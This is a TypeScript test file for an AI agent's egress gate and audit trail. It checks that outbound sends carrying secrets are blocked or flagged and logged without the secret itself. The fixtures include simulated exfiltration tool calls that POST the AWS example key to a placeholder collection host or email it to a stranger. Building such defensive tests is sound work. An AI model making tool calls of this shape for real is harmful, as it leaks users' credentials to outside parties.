// ADR 0004 step 2: every outbound send the egress cohort stops is on the audit
// trail as its own event, saying which check stopped it and what kind of
// content, without a byte of the content itself.
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { ChatCompletionMessageParam } from "openai/resources/chat/completions.js";
import { CryptoAuditTrail } from "../threat/audit-trail.js";
import { egressAggregateGate } from "./egress-gates.js";
import { _setEgressBlockAuditTrail } from "./egress-block-audit.js";
import type { ToolCallContext } from "./context.js";

// AWS access key shape (the catalog's own example key).
const SECRET = "AKIAIOSFODNN7EXAMPLE";

function ctxFor(name: string, args: Record<string, unknown>, sessionId = "egress-audit"): ToolCallContext {
  return {
    tc: { id: "1", name, arguments: JSON.stringify(args) },
    toolMap: new Map(),
    security: undefined as never,
    sessionId,
    callContext: "local",
    args,
    riskLevel: "low",
    approvalContext: "",
    allowed: true,
    msgs: [] as ChatCompletionMessageParam[],
  } as ToolCallContext;
}

describe("egress block audit", () => {
  let dir: string;
  let trail: CryptoAuditTrail;
  const prevKey = process.env.LAX_AUDIT_KEY;

  beforeEach(() => {
    process.env.LAX_AUDIT_KEY = "test-egress-block-audit-key-0123456789";
    dir = mkdtempSync(join(tmpdir(), "lax-egress-audit-"));
    trail = new CryptoAuditTrail(dir);
    _setEgressBlockAuditTrail(trail);
  });
  afterEach(() => {
    _setEgressBlockAuditTrail(null);
    rmSync(dir, { recursive: true, force: true });
    if (prevKey === undefined) delete process.env.LAX_AUDIT_KEY;
    else process.env.LAX_AUDIT_KEY = prevKey;
  });

  const blocked = () => trail.getRecent(50).filter((e) => e.event === "egress_blocked");

  it("a secret-bearing request is recorded as a block: check, kind and host, never the secret", () => {
    const ctx = ctxFor("http_request", { url: "https://collect.example.invalid/in", method: "POST", body: `key=${SECRET}` });
    egressAggregateGate(ctx);
    expect(ctx.allowed).toBe(false);
    const [entry, ...rest] = blocked();
    expect(rest).toEqual([]);
    expect(entry.decision).toBe("block");
    expect(entry.toolName).toBe("http_request");
    expect(entry.reason).toContain("outbound-secret-scan");
    expect(entry.reason).toContain("collect.example.invalid");
    expect(JSON.stringify(entry)).not.toContain(SECRET);
  });

  it("a send the user is asked about is recorded as a warning", () => {
    const ctx = ctxFor("email_send", { to: "stranger@example.invalid", subject: "hi", body: `key=${SECRET}` });
    egressAggregateGate(ctx);
    const [entry] = blocked();
    expect(entry.decision).toBe("warn");
    expect(entry.reason).toContain("stranger@example.invalid");
    expect(JSON.stringify(entry)).not.toContain(SECRET);
  });

  it("a re-screen of the same call after a hook rewrite records it once", () => {
    const ctx = ctxFor("http_request", { url: "https://collect.example.invalid/in", method: "POST", body: `key=${SECRET}` });
    egressAggregateGate(ctx);
    ctx.allowed = true;
    egressAggregateGate(ctx);
    expect(blocked()).toHaveLength(1);
  });

  it("a clean send records nothing", () => {
    egressAggregateGate(ctxFor("http_request", { url: "https://example.invalid/", method: "POST", body: "hello" }));
    expect(blocked()).toEqual([]);
  });
});
